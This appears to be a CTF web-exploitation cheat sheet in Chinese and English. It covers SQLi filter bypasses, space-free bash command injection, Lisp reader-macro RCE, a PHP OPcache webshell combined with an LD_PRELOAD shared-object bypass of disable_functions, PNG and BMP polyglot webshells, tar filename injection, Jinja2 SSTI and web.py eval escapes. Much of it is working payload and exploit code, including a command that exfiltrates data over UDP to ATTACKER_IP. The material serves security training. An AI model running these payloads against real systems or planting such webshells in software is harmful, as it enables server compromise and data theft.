# CTF Web - Server-Side Code Execution & Access Attacks (Part 2)

## Table of Contents
- [SQLi Keyword Fragmentation Bypass (SecuInside 2013)](#sqli-keyword-fragmentation-bypass-secuinside-2013)
- [SQL WHERE Bypass via ORDER BY CASE (Sharif CTF 2016)](#sql-where-bypass-via-order-by-case-sharif-ctf-2016)
- [SQL Injection via DNS Records (PlaidCTF 2014)](#sql-injection-via-dns-records-plaidctf-2014)
- [Bash Brace Expansion for Space-Free Command Injection (Insomnihack 2016)](#bash-brace-expansion-for-space-free-command-injection-insomnihack-2016)
- [Common Lisp Injection via Reader Macro (Insomnihack 2016)](#common-lisp-injection-via-reader-macro-insomnihack-2016)
- [PHP7 OPcache Binary Webshell + LD_PRELOAD disable_functions Bypass (ALICTF 2016)](#php7-opcache-binary-webshell--ld_preload-disable_functions-bypass-alictf-2016)
- [Wget GET Parameter Filename Trick for PHP Shell Upload (SECUINSIDE 2016)](#wget-get-parameter-filename-trick-for-php-shell-upload-secuinside-2016)
- [Tar Filename Command Injection (CyberSecurityRumble 2016)](#tar-filename-command-injection-cybersecurityrumble-2016)
- [PNG/PHP Polyglot Upload + Double Extension + disable_functions Bypass (MetaCTF Flash 2026)](#pngphp-polyglot-upload--double-extension--disable_functions-bypass-metactf-flash-2026)
- [PHP BMP Pixel Webshell with Filename Truncation (Nuit du Hack CTF 2018)](#php-bmp-pixel-webshell-with-filename-truncation-nuit-du-hack-ctf-2018)
- [Editor Backup File Source Disclosure (h4ckc0n 2017)](#editor-backup-file-source-disclosure-h4ckc0n-2017)
- [date -f Arbitrary File Read (Can-CWIC 2017)](#date--f-arbitrary-file-read-can-cwic-2017)
- [Apache mod_rewrite PATH_INFO Bypass (EKOPARTY 2017)](#apache-mod_rewrite-path_info-bypass-ekoparty-2017)
- [PHP ReDoS to Skip Code Execution (CODE BLUE 2017)](#php-redos-to-skip-code-execution-code-blue-2017)
- [Custom Serializer Integer Overflow 256 to 0 Length (Codegate 2018)](#custom-serializer-integer-overflow-256-to-0-length-codegate-2018)
- [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013) *(stub — see [server-side-deser.md](server-side-deser.md))*
- [Java Deserialization (ysoserial)](#java-deserialization-ysoserial) *(stub — see [server-side-deser.md](server-side-deser.md))*
- [Python Pickle Deserialization](#python-pickle-deserialization) *(stub — see [server-side-deser.md](server-side-deser.md))*
- [Race Conditions (Time-of-Check to Time-of-Use)](#race-conditions-time-of-check-to-time-of-use) *(stub — see [server-side-deser.md](server-side-deser.md))*
- [Unanchored Regex Command Injection (picoCTF 2018)](#unanchored-regex-command-injection-picoctf-2018)
- [Jinja2 SSTI via globals.__self__.exec() String Concat Bypass (InCTF 2018)](#jinja2-ssti-via-globals__self__exec-string-concat-bypass-inctf-2018)
- [web.py reparam() eval + __subclasses__ with Blanked Builtins (HITCON 2018)](#webpy-reparam-eval--__subclasses__-with-blanked-builtins-hitcon-2018)
- [Redis Lua Injection via redis.call() (HumanCTF 2018)](#redis-lua-injection-via-rediscall-humanctf-2018)
- [PHP create_function String Interpolation RCE (FireShell 2019)](#php-create_function-string-interpolation-rce-fireshell-2019)
- [php://input + NULL Byte + ~Bitwise base64 Filter Bypass (DefCamp 2018)](#phpinput--null-byte--bitwise-base64-filter-bypass-defcamp-2018)
- [EXIF ImageDescription Shell Injection via exiftool (OTW Advent 2018)](#exif-imagedescription-shell-injection-via-exiftool-otw-advent-2018)
- [.phar Extension Bypass for PHP Upload Blacklists (35C3 2018)](#phar-extension-bypass-for-php-upload-blacklists-35c3-2018)
- [vsftpd 2.3.4 Smiley-Face Backdoor (P.W.N. CTF 2018)](#vsftpd-234-smiley-face-backdoor-pwn-ctf-2018)

注入类攻击（SQLi、SSTI、SSRF、XXE、命令注入、PHP 类型混淆、PHP 文件包含）参见 [server-side.md](server-side.md)。反序列化攻击（Java、Pickle）与竞态条件参见 [server-side-deser.md](server-side-deser.md)。CVE 型利用、路径遍历绕过、Flask/Werkzeug 调试器及其他进阶技巧参见 [server-side-advanced.md](server-side-advanced.md)。

*另见：[server-side-exec.md](server-side-exec.md)，涵盖 Ruby/Perl/JS 代码注入、LaTeX 注入 RCE、PHP preg_replace /e RCE、PHP 反引号执行、PHP assert() 注入、Prolog 注入、ReDoS 时间侧信道、文件上传到 RCE（.htaccess、日志投毒、Python .so 劫持、Gogs symlink、ZipSlip）、来自 cookie 的 PHP 反序列化、PHP extract() 变量覆盖、XPath 盲注、API filter 注入、HTTP 响应头隐藏、WebSocket mass assignment 与 Thymeleaf SpEL SSTI。*

---

## SQLi Keyword Fragmentation Bypass (SecuInside 2013)

**模式：** 单次执行的 `preg_replace()` 关键词过滤，可通过把被删除的关键词嵌进 payload 单词内部来绕过。

**关键点：** 如果过滤器只删除一次 `load_file`，那么 `unload_fileon` 删除后会变成 `union`。内部关键词相当于一个“牺牲片段”。

```php
// Vulnerable filter (single-pass, case-sensitive)
$str = preg_replace("/union/", "", $str);
$str = preg_replace("/select/", "", $str);
$str = preg_replace("/load_file/", "", $str);
$str = preg_replace("/ /", "", $str);
```

```sql
-- Bypass payload (spaces replaced with /**/ comments)
(0)uniunionon/**/selselectect/**/1,2,3/**/frfromom/**/users
-- Or nest the stripped keyword:
unload_fileon/**/selectload_filect/**/flag/**/frload_fileom/**/secrets
```

**变体：** 大小写敏感过滤可混写大小写（`unIoN`）。空格过滤可改用 `/**/`、`%09`、`%0a`。递归过滤可尝试关键词翻倍（`ununionion`）。务必确认过滤器是单次替换还是递归替换。

---

## SQL WHERE Bypass via ORDER BY CASE (Sharif CTF 2016)

当 `WHERE` 子句受限，无法直接筛选时，可用 `ORDER BY CASE` 控制结果排序并提取数据：

```sql
SELECT * FROM messages ORDER BY (CASE WHEN msg LIKE '%flag%' THEN 1 ELSE 0 END) DESC
```

**关键点：** 即使拿不到 `WHERE`，也能利用带条件表达式的 `ORDER BY` 让目标行排到最前。再配合 `LIMIT 1` 可锁定具体记录。

---

## SQL Injection via DNS Records (PlaidCTF 2014)

**模式：** 应用对用户可控的 IP 调用 `gethostbyaddr()` 或 `dns_get_record()`，并将结果未经转义地拼进 SQL 查询。攻击者可通过自己控制的 DNS PTR/TXT 记录注入 SQL。

**攻击准备：**
1. 把自己的 IP PTR 记录指向可控域名（例如 `evil.example.com`）
2. 在该域名下添加包含 SQL payload 的 TXT 记录
3. 触发应用去解析你的 IP（例如密码重置流程）

```php
// Vulnerable code:
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$details = dns_get_record($hostname);
mysql_query("UPDATE users SET resetinfo='$details' WHERE ...");
// TXT record: "' UNION SELECT flag FROM flags-- "
```

**关键点：** DNS 记录（PTR、TXT、MX）是常被忽视的注入通道。任何把 IP/主机名解析结果写入数据库查询的应用都可能中招。控制来源是攻击者自有域名的 DNS 记录，或其 IP 的反向解析记录。

---

## Bash Brace Expansion for Space-Free Command Injection (Insomnihack 2016)

当空格和常见 shell 元字符（`$`、`&`、`\`、`;`、`|`、`*`）都被过滤时，可利用 bash 大括号展开与进程替换：

```bash
# Brace expansion inserts spaces: {cmd,-flag,arg} expands to: cmd -flag arg
{ls,-la,../..}

# Exfiltrate via UDP when outbound TCP is blocked:
<({ls,-la,../..}>/dev/udp/ATTACKER_IP/53)

# Execute base64-encoded payload:
<({base64,-d,ENCODED_PAYLOAD}>/tmp/s.sh)
```

**关键点：** Bash 的 `{a,b,c}` 展开会在不使用字面空格的情况下生成以空格分隔的 token。再配合 `/dev/udp/` 或 `/dev/tcp/` 外传数据，可绕过阻止空格和大多数 shell 元字符的过滤器。

---

## Common Lisp Injection via Reader Macro (Insomnihack 2016)

Lisp 的 `read` 在解析阶段就会执行 `#.(expression)` 形式的 reader macro。如果应用用 `read` 读取用户输入（而不是 `read-line`），就可直接执行任意代码：

```lisp
#.(ext:run-program "cat" :arguments '("/flag"))
#.(run-shell-command "cat /flag")
```

**关键点：** Lisp 的 `read` 天生就把数据视作代码，`#.()` reader macro 会在解析时求值任意表达式。这相当于 Lisp 版 SQL 注入。安全替代是：对字符串输入使用 `read-line`，绝不要对不可信数据调用 `read`。

---

## Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)

去掉第一个 payload 的 pickle STOP opcode（`\x2e`）后再拼接第二个 payload，两个 `__reduce__()` 调用就会在一次 `pickle.loads()` 中连续执行。再链上 `os.dup2()` 可把输出重定向到 socket。完整利用代码见 [server-side-deser.md](server-side-deser.md#pickle-chaining-via-stop-opcode-stripping-volgactf-2013)。

---

## Java Deserialization (ysoserial)

Java 序列化对象常见于 cookie 或 POST 中（前缀 `rO0AB` / `aced0005`）。可使用 ysoserial 的 gadget chain（如 CommonsCollections、URLDNS 盲探测）构造 payload。详见 [server-side-deser.md](server-side-deser.md#java-deserialization-ysoserial)。

---

## Python Pickle Deserialization

`pickle.loads()` 会调用 `__reduce__()`，因此 `(os.system, ('cmd',))` 可直接触发 RCE。常见于 Flask session、ML 模型文件和 Redis 对象。payload 与受限 unpickler 绕过见 [server-side-deser.md](server-side-deser.md#python-pickle-deserialization)。

---

## Race Conditions (Time-of-Check to Time-of-Use)

并发请求可以绕过 check-then-act 模式（余额、优惠券、用户名唯一性）。同时发 50 个以上请求，让它们都看到修改前状态。异步利用代码与识别模式见 [server-side-deser.md](server-side-deser.md#race-conditions-time-of-check-to-time-of-use)。

---

---

## PHP7 OPcache Binary Webshell + LD_PRELOAD disable_functions Bypass (ALICTF 2016)

**模式（Homework）：** 多阶段利用链：SQLi 写文件 + PHP7 OPcache 污染 + `LD_PRELOAD` 绕过 `disable_functions`。

**阶段 1 - OPcache 污染：**
启用 `opcache.file_cache` 的 PHP7 会把编译后的字节码缓存到 `/tmp/OPcache/[system_id]/[webroot]/script.php.bin`。可通过 SQLi 的 `INTO DUMPFILE` 替换这个 `.bin` 文件，即使上传限制阻止 PHP 文件，也能执行任意 PHP。

```bash
# 1. Calculate system_id from phpinfo() data
python3 system_id_scraper.py http://target/phpinfo.php
# Output: 39b005ad77428c42788140c6839e6201

# 2. Generate opcode cache locally (match PHP version)
php -d opcache.enable_cli=1 -d opcache.file_cache=/tmp/OPcache \
    -d opcache.file_cache_only=1 -f payload.php

# 3. Patch system_id in binary (bytes 9-40)
# 4. Upload via SQLi INTO DUMPFILE:
```
```sql
-1 UNION SELECT X'<hex_of_payload.php.bin>'
INTO DUMPFILE '/tmp/OPcache/39b005ad77428c42788140c6839e6201/var/www/html/upload/evil.php.bin' #
```

**阶段 2 - LD_PRELOAD 绕过：**
当 `disable_functions` 禁掉所有 exec 类函数时，可用 `putenv()` + `mail()` 执行代码。PHP 的 `mail()` 会调用外部 sendmail，而 sendmail 会遵循 `LD_PRELOAD`。

```c
/* evil.c — compile: gcc -Wall -fPIC -shared -o evil.so evil.c -ldl */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload(char *cmd) {
    char buf[512];
    snprintf(buf, sizeof(buf), "%s > /tmp/_output.txt", cmd);
    system(buf);
}

int geteuid() {
    if (getenv("LD_PRELOAD") == NULL) return 0;
    unsetenv("LD_PRELOAD");
    char *cmd = getenv("_evilcmd");
    if (cmd) payload(cmd);
    return 1;
}
```

```php
<?php
// payload.php — upload evil.so via webapp, deploy this via OPcache
putenv("LD_PRELOAD=/var/www/html/upload/evil.so");
putenv("_evilcmd=" . $_GET['cmd']);
mail("x@x.x", "", "", "");
show_source("/tmp/_output.txt");
?>
```

**关键点：** PHP 的 `disable_functions` 只限制 PHP 层函数。`mail()` 拉起的外部程序不受这层限制，而 `LD_PRELOAD` 可覆盖这些外部程序里的任意 libc 函数。OPcache 的 `.bin` 文件除了 `system_id` 匹配外没有额外完整性校验，因此把它替换为构造好的二进制缓存，就能在上传校验剥离 PHP 内容的情况下仍执行任意 PHP。

---

## Wget GET Parameter Filename Trick for PHP Shell Upload (SECUINSIDE 2016)

**模式（trendyweb）：** 服务端用 `wget` 下载用户提供的 URL，并用 `parse_url()` 校验路径。`wget` 在未指定 `-O` 时会把 GET 参数保留到文件名中，从而形成 `.php` 扩展绕过。

```text
URL: http://attacker.com/avatar.png?shell.php
parse_url($url)['path'] = '/avatar.png'      # passes .png check
wget saves as: avatar.png?shell.php           # server treats as PHP
```

访问时需对 `?` 做 URL 编码：`http://target/data/hash/avatar.png%3fshell.php?cmd=id`

**关键点：** `wget` 在未指定 `-O` 时会把 GET 参数保留到输出文件名中；而 `parse_url()` 会把 path 和 query 拆开，所以校验逻辑只看到路径扩展名。最终落盘文件在 query 部分获得 `.php` 扩展，Apache/nginx 会把它当作 PHP。

---

## Tar Filename Command Injection (CyberSecurityRumble 2016)

**模式（Jobs）：** 服务端会解压 tar 包，并通过 `.cgi` 脚本展示文件名。若文件名带有 shell 元字符，且在传给 shell 前未做净化，就能形成命令注入。

```bash
# Create tar with command injection filename
mkdir exploit && cd exploit
touch 'name; cat /flag #'
tar cf exploit.tar *
# Upload — server runs: echo "name; cat /flag #" in CGI context
```

**关键点：** 服务端若通过 shell 处理用户上传归档中的文件名（tar、zip），文件名里的特殊字符就会成为注入向量。这里分号打破文件名上下文，`#` 注释掉尾部内容。凡是把不可信归档文件名插入 shell 的地方，都必须先做净化。

---

## PNG/PHP Polyglot Upload + Double Extension + disable_functions Bypass (MetaCTF Flash 2026)

**模式（Brand Kit）：** 上传过滤器拒绝 `.php`，但允许图片上传。nginx/PHP-FPM 会执行以 `.php` 结尾的文件，而不在意前面还有其他扩展。`disable_functions` 禁掉了所有命令执行函数，但文件系统函数仍可用。

**步骤 1：创建 PNG/PHP polyglot**
```bash
# Create a valid PNG that also contains PHP code after the IEND chunk
# PHP interpreter ignores binary data before <?php
cp valid_image.png polyglot.png.php

# Append PHP payload after the PNG IEND marker
cat >> polyglot.png.php << 'PAYLOAD'
<?php
// disable_functions blocks system/exec/passthru/shell_exec/popen/proc_open
// Use filesystem functions instead
$files = scandir('/');
foreach ($files as $f) {
    if (strpos($f, 'flag') !== false || strpos($f, 'ctf') !== false) {
        echo "FOUND: $f\n";
        echo file_get_contents("/$f");
    }
}
// Fallback: list everything
echo "\n--- Full listing ---\n";
print_r($files);
?>
PAYLOAD
```

**步骤 2：使用双扩展上传**
```bash
# Filter checks extension — .png.php has .php at the end
# Some filters only check first extension (.png) or reject exact match on .php
curl -F 'file=@polyglot.png.php;type=image/png' http://target/upload

# Alternative double extensions to try:
# .png.php    .jpg.php    .gif.php
# .png.phtml  .png.phar   .png.php5
# .php.png (some filters check last extension, nginx checks .php anywhere)
```

**步骤 3：访问并枚举**
```bash
# The uploaded file is served by nginx which passes .php to PHP-FPM
curl http://target/uploads/polyglot.png.php

# If flag filename is randomized, first enumerate:
# scandir('/') reveals: flag_a8f3c9d2e1.txt
# Then read it with file_get_contents()
```

**当 `disable_functions` 阻止执行时可用的 PHP 函数：**
```php
<?php
// File discovery
scandir('/');                          // List directory
glob('/flag*');                        // Glob pattern match
file_exists('/flag.txt');              // Check existence

// File reading
file_get_contents('/flag.txt');        // Read entire file
readfile('/flag.txt');                 // Output file directly
file('/flag.txt');                     // Read as array of lines
fopen('/flag.txt', 'r');              // Stream-based read

// Environment / info leaking
phpinfo();                             // Full PHP config, env vars
getenv('FLAG');                        // Environment variable
get_defined_vars();                    // All variables in scope

// If open_basedir is set, check what's allowed:
ini_get('open_basedir');
ini_get('disable_functions');
?>
```

**关键点：** 这里是三层叠加：(1) PNG/PHP polyglot 因为前缀是合法 PNG magic bytes，可以通过图片校验；(2) 双扩展 `.png.php` 能绕过只拒绝 `.php` 的上传过滤，同时匹配 nginx 的 `\.php$` 规则；(3) 即使 `disable_functions` 禁掉所有命令执行，`scandir()` + `file_get_contents()` 仍足以完成目录枚举与文件读取。遇到 `disable_functions` 时，优先枚举文件系统，因为 flag 文件名常常是随机的。

**识别时机：** 典型是“仅允许图片”的文件上传题。先看 `phpinfo()` 里的 `disable_functions`。若所有 exec 系函数都被禁用，就转向纯 PHP 文件系统函数。

**References:** MetaCTF Flash CTF 2026 "Brand Kit"

---

### PHP BMP Pixel Webshell with Filename Truncation (Nuit du Hack CTF 2018)

**模式：** 把 PHP 代码编码进 BMP 像素颜色（BGR 格式）中。服务端会校验扩展名（例如要求 `.JPG` 或 `.BMP`），但会把文件名截断到固定长度。于是可构造类似 `'A'*46 + '.php.JPG'` 的文件名，先通过 `.JPG` 校验，再在 50 字符限制下被截成 `'A'*46 + '.php'`。

**BMP 像素编码原理：**
```python
import struct
import requests

# BMP files store pixel data as raw bytes in BGR order (Blue, Green, Red)
# PHP ignores non-PHP content before <?php tags
# So embedding PHP code in pixel color values creates a valid BMP that is also valid PHP

payload = "<?php @$_GET[a]($_GET[b]);?>"

def pad(s, block=3):
    """Pad payload to multiple of 3 bytes (one pixel = 3 color bytes)."""
    while len(s) % block != 0:
        s += " "
    return s

def chunk(s, n):
    """Split string into n-byte chunks."""
    return [s[i:i+n] for i in range(0, len(s), n)]

# Read a template BMP file (small valid BMP, e.g., 10x10)
with open("template.bmp", "rb") as f:
    data = bytearray(f.read())

# Find the pixel data offset (stored at byte 10-13 in BMP header)
pixel_offset = struct.unpack_from('<I', data, 10)[0]

# Encode PHP payload as BMP pixel colors
padded = pad(payload)
index = pixel_offset
for c in chunk(padded, 3):
    data[index + 2] = ord(c[0])  # R -> B in BMP format (BGR order)
    data[index + 1] = ord(c[1])  # G stays
    data[index] = ord(c[2])      # B -> R in BMP format
    index += 4  # skip alpha byte (if 32-bit BMP) or use 3 for 24-bit

# Filename truncation exploit:
# Server checks extension: must end with .JPG or .BMP
# Server truncates filename to 50 chars
# "A" * 46 + ".php" = 50 chars (after truncation)
# "A" * 46 + ".php" + ".JPG" = 54 chars (passes extension check before truncation)
name = "A" * 46 + ".php"

# Upload with the extension that passes validation
requests.post(
    "http://target/upload",
    data={"data": str(list(data)), "name": name + ".JPG", "format": "BMP"}
)

# Access the webshell (filename truncated to .php)
r = requests.get(f"http://target/uploads/{name}", params={"a": "system", "b": "cat /flag.txt"})
print(r.text)
```

**文件名截断变体：**
```text
# 50-char limit example:
"A"*46 + ".php" + ".JPG"     -> truncated to "A"*46 + ".php"  (50 chars)
"A"*46 + ".php" + ".png"     -> truncated to "A"*46 + ".php"  (50 chars)

# Other truncation lengths — adjust padding:
# For N-char limit: "A"*(N-4) + ".php" + ".ext"
# The ".ext" passes the extension check, then gets truncated away
```

**关键点：** BMP 把像素以原始 BGR 字节存储，而 PHP 会忽略 `<?php` 之前的非 PHP 内容。服务端若对文件名做固定长度截断，则 `'A'*46 + '.php' + '.JPG'` 会先通过扩展名校验，最终却以 `.php` 保存。这里组合了三种绕过：(1) polyglot 文件格式（合法 BMP + 合法 PHP），(2) 通过文件名截断规避扩展名检查，(3) Webshell 藏在像素数据里，只要服务端不重新渲染整张图，就能保留下来。

---

## Editor Backup File Source Disclosure (h4ckc0n 2017)

**模式：** 文本编辑器在保存时常会在原文件旁边留下备份文件。这些文件常被误部署到 Web 服务器上，并以纯文本返回，从而在 PHP 执行前泄露源码。

| Editor | Backup pattern |
|--------|---------------|
| gedit  | `file~` |
| vim    | `.file.swp` (also `.file.swn`, `.file.swo`) |
| nano   | `file~` |
| emacs  | `file~` and `#file#` |

```bash
# Check common backup variants for a target file
TARGET="http://target/checker.php"
for suffix in "~" ".swp" ".bak" ".orig"; do
    curl -s -o /dev/null -w "%{http_code} $TARGET$suffix\n" "$TARGET$suffix"
done
# vim hidden-file backup:
curl -s "http://target/.checker.php.swp"
# emacs auto-save:
curl -s "http://target/#checker.php#"
```

```bash
# Practical: grab vim swap file and recover source
curl -o checker.swp "http://target/.checker.php.swp"
vim -r checker.swp          # opens recovered file in vim
# Or: strings checker.swp   # quick content extraction
```

**关键点：** 排查源码泄露时，一定要试 `filename~`、`.filename.swp`、`#filename#` 这类变体。再结合目录列表，或 JS/HTML 注释中泄露的文件名，扩大枚举面。

---

## date -f Arbitrary File Read (Can-CWIC 2017)

**模式：** GNU `date` 的 `-f`/`--file` 参数会逐行读取文件，并把每行当作日期格式串处理。当用户可控输入被当作 `date` 命令参数使用时，这就提供了任意文件读取能力。

```bash
# Normal behavior: date -f /etc/passwd reads each line as a date string
# Lines that aren't valid dates print an error message containing the line content
date -f /etc/passwd
# Output includes: date: invalid date 'root:x:0:0:root:/root:/bin/bash'
# → file contents leak through error messages
```

```python
import subprocess

# Simulate: if web app passes user arg to date command
# e.g., os.system(f"date -d '{user_input}'") where user controls the flag value
# Or: user_input = "-f /etc/passwd" injected into arguments

# Brute-force readable files
targets = ['/etc/passwd', '/flag', '/flag.txt', '/home/ctf/flag']
for t in targets:
    result = subprocess.run(['date', '-f', t], capture_output=True, text=True)
    print(result.stderr)  # errors contain file content
```

```bash
# When command injection is available and date is accessible:
curl "http://target/cgi-bin/app.cgi" --data "cmd=date+-f+/flag.txt"
# Response error output reveals flag content
```

**关键点：** 只要 `date` 命令参数可控，`date --file` / `date -f` 就是任意文件读。错误信息会把无法识别的行原样打印出来，于是能按行泄露文件内容。适用于所有带 GNU coreutils `date` 的系统。

---

## Apache mod_rewrite PATH_INFO Bypass (EKOPARTY 2017)

**模式：** Apache mod_rewrite 用正则匹配请求路径。访问 `/index.php/getflag` 时，会先命中一个宽松的 `/index.php` 规则（允许 PHP 文件处理请求），从而绕过本应用于 `/getflag` 的限制规则。PHP 最终会把 `/getflag` 作为 `PATH_INFO` 接收。

```apache
# Vulnerable .htaccess / rewrite rules:
RewriteRule ^index\.php$ index.php [L]          # allows access to index.php
RewriteRule ^getflag$    /forbidden.html [R,L]  # blocks /getflag directly
```

```bash
# Direct access — blocked by second rule:
curl http://target/getflag          # → 403 or redirect to forbidden.html

# PATH_INFO bypass — matches first rule, PHP gets PATH_INFO=/getflag:
curl http://target/index.php/getflag   # → executes index.php with PATH_INFO=/getflag
```

```php
// In index.php — reads PATH_INFO to dispatch
$action = $_SERVER['PATH_INFO'];   // "/getflag"
if ($action === '/getflag') {
    echo $flag;
}
```

**规则顺序很重要：** Apache 会自上而下评估 RewriteRule，并在第一个带 `[L]` 的命中点停止。宽松的 PHP 文件规则会先吃掉 `/index.php/anything`，后面的限制规则不再生效。

**关键点：** 这是 mod_rewrite 规则顺序与 PHP PATH_INFO 的联动问题：`/index.php/protected-path` 会先命中 PHP 文件规则，从而绕过访问控制；随后 PHP 在 `$_SERVER['PATH_INFO']` 中拿到尾部路径，并交给应用自己的路由逻辑处理。

---

## PHP ReDoS to Skip Code Execution (CODE BLUE 2017)

**模式：** PHP 的 `preg_match()` 是同步执行的。当一个存在灾难性回溯的正则去匹配用户可控输入时，PCRE 引擎会超时，`preg_match()` 返回 `false`。依赖该匹配结果后续执行的代码（例如向 ACL 表插入记录）就不会运行。少一条 ACL 记录，可能就等价于没有限制，甚至落到最宽松的默认策略。

```php
// Vulnerable pattern: regex check followed by ACL insert
if (preg_match('/^(ADMIN-+)+$/', $role)) {
    // If this times out (returns false), the block is never entered
    // AND code after the if-block may also be skipped or behave differently
}
// ACL INSERT that only runs on successful match:
$db->query("INSERT INTO acl (user, role) VALUES (?, ?)", [$user, 'ADMIN']);
// Missing ACL row = no restriction applied
```

```python
import requests

# Payload: trigger catastrophic backtracking on the regex (ADMIN-+)+
# The nested quantifier causes exponential backtracking with enough repetitions
redos_payload = 'ADMIN-' + '-' * 50 + '!'   # trailing ! forces full backtrack
# Or the classic: ADMIN--(###A)*  structure repeated

r = requests.post('http://target/register', data={
    'username': 'victim',
    'role': redos_payload
})
# If the ACL INSERT is skipped, the user now has no restriction on their account
```

**触发回溯的模式：**
```text
ADMIN--(###A)*  repeated 20+ times
(ADMIN-+)+X     where X doesn't match, forcing full backtrack
```

**关键点：** PHP ReDoS 不只是 DoS。`preg_match()` 超时后返回的是 `false`（不是 `0`），因此任何依赖它的后续副作用代码都可能被静默跳过。若被跳过的是 ACL 插入、审计记录、锁定逻辑等安全状态写入，就会演变成权限或执行路径绕过。

---

## Custom Serializer Integer Overflow 256 to 0 Length (Codegate 2018)

**模式：** 一个自定义 PHP 文件型数据库以 `<type_byte><length_byte><data>` 存储字段，长度只占 1 字节（`chr(len)`）。当某字段恰好是 256 字节时，`chr(256)` 会回绕成 `\x00`，解析器就会把该字段长度当成 0。剩余的 256 字节数据随即溢出到后续字段边界，可覆盖密码哈希、权限级别等字段。

```python
import hashlib
import requests

# Custom DB format per field: \x01 (string type) + chr(length) + data
# Fields stored in order: email, ip, level
# Goal: overwrite the password hash and level fields by overflowing email

# Craft the payload to inject into the "email" field
target_password = "hacked"
pw_hash = hashlib.md5(target_password.encode()).hexdigest()  # 32 hex chars

# These are the fields we want to inject after the overflow
injected_mail = '\x01\x20' + pw_hash          # type=string, len=32, data=md5(pw)
injected_level = '\x01\x01' + '2'             # type=string, len=1, data='2' (admin)

# Calculate padding to make total email field exactly 256 bytes
overhead = len(injected_mail) + len(injected_level) + 2  # +2 for the ip field header
pad_len = 256 - overhead
injected_ip = '\x01' + chr(pad_len) + 'A' * pad_len  # type=string, padded ip field

# Combine: mail_data + ip_data + level_data = 256 bytes total
# When stored as email field: chr(256) = chr(0) = \x00 → length = 0
# Parser reads 0 bytes for email, then the 256 bytes become the next fields
payload_email = injected_mail + injected_ip + injected_level

# Register with the overflow payload as the email
r = requests.post("http://target/register", data={
    "email": payload_email,
    "password": target_password,
    "username": "attacker"
})
print(r.text)
```

```text
# How the overflow works in the file-based DB:

# Normal record layout:
# [email_type][email_len][email_data][ip_type][ip_len][ip_data][level_type][level_len][level_data]
#   \x01       \x10       user@x.com   \x01    \x09   127.0.0.1  \x01       \x01       1

# Overflow: email is 256 bytes → chr(256) = \x00
# [email_type][0x00][...256 bytes of attacker data...]
#   \x01       \x00  ← parser reads 0 bytes for email
#                    ← the 256 bytes are now parsed as ip, level, etc.
#                    ← attacker controls password hash and level fields
```

```python
# Generalized overflow finder for custom serialization formats
def find_overflow_length(field_width_bytes):
    """
    Calculate the overflow value for N-byte length fields.
    1 byte: overflows at 256 → 0
    2 bytes: overflows at 65536 → 0
    """
    return 2 ** (8 * field_width_bytes)

# 1-byte length: 256 → 0
assert find_overflow_length(1) == 256
# 2-byte length: 65536 → 0
assert find_overflow_length(2) == 65536
```

**关键点：** 单字节长度字段在 256 时会回绕为 0，使一个字段的数据溢出到后续字段。任何使用定宽长度字段的自定义序列化格式都值得怀疑。重点寻找只用 1 字节（最大 255）或 2 字节（最大 65535）记录长度的格式。常见信号包括：二进制文件数据库、自定义 session 格式、私有协议解析器。这类攻击通常要求你知道或猜到字段顺序与编码格式。标准反序列化攻击可另见 [server-side-deser.md](server-side-deser.md)。

---

## Unanchored Regex Command Injection (picoCTF 2018)

**模式：** 输入校验使用 `preg_match('/^<ip-pattern>/i', $ip)`，却缺少结尾 `$` 锚点。于是只要字符串开头像一个合法 IP，就会通过校验；攻击者可在后面追加分号和 shell 命令，而这些内容仍会流入后续的 `exec("ping $ip")`。

```php
// Vulnerable
if (preg_match('/^(\d{1,3}\.){3}\d{1,3}/', $_GET['ip'])) {
    exec("ping -c 1 " . $_GET['ip']);
}
```

```bash
curl "http://target/ping.php?ip=1.1.1.1;cat%20/flag.txt"
# matches ^1.1.1.1 then executes: ping -c 1 1.1.1.1;cat /flag.txt
```

**关键点：** 只有 `^pattern` 没有 `$`，只固定前缀，不限制后缀。所有输入校验正则都应两端锚定，或使用 `preg_match('/\A...\z/')`。审计时可搜 `preg_match('/\^`，再检查同一条规则里是否也有 `\$/` 或 `\\z/`。同类问题也常见于 JavaScript 的 `String.match` 与 Python 的 `re.match`（默认左锚定，但不右锚定）。

**References:** picoCTF 2018 — Fancy Alive Monitoring, writeups 11706, 11721, 11761

---

## Jinja2 SSTI via globals.__self__.exec() String Concat Bypass (InCTF 2018)

**模式：** 模板过滤器屏蔽了 `__class__`、`os`、`import`、`eval`、`subprocess` 等字面量。可从任意已绑定的 Jinja 变量走到 `globals.__self__`（Python builtins 模块），再调用 `exec` 执行一个通过字符串拼接动态还原禁用词的 payload。

```text
{{ globals.__self__.exec("imp" + "ort o" + "s;o" + "s.system('cat /flag')") }}

# Alternative via any Python object already in context:
{{ request.__class__.__init__.__globals__.__builtins__.exec(
    "__imp"+"ort__('o'+'s').system('id')"
) }}
```

**关键点：** Jinja 作用域里的函数对象都暴露 `__globals__`，再进一步就能拿到真实的 `builtins`。即使 `os`、`import`、`__class__` 被黑名单过滤，也可以通过字符串拼接、`chr(...)` 等方式把禁用词拆开，让预渲染过滤器看不到完整字符串。真正的加固应使用 `jinja2.sandbox.SandboxedEnvironment`，而不是字符串黑名单。

**References:** InCTF 2018 — TorPy, writeup 11519

---

## web.py reparam() eval + __subclasses__ with Blanked Builtins (HITCON 2018)

**模式：** `web.py` 的 `reparam()` 会执行 `eval(expr, {"__builtins__": object()}, context)`，把 `${...}` 占位符插进 SQL。`__builtins__` 虽然被替换成一个空 `object()` 以阻止 `__import__`，但 `[].__class__.__base__.__subclasses__()` 仍可枚举所有已加载类，其中包括 `subprocess.Popen`。当 `limit` 或 `order` 参数可控时，这就像 SQLi 一样逃逸进 eval 上下文。

```python
# web.py 0.38 sink (db.select passes limit through reparam)
db.select('posts',
          limit=user_input,   # interpolated via ${...} eval
          order='ups desc')

# Payload — list all subclasses to locate Popen, then call it
user_input = (
    "1 ${[c for c in ().__class__.__base__.__subclasses__()"
    " if c.__name__ == 'Popen'][0](['/bin/sh','-c','cat /flag'],"
    "stdout=-1).communicate()[0]}"
)
```

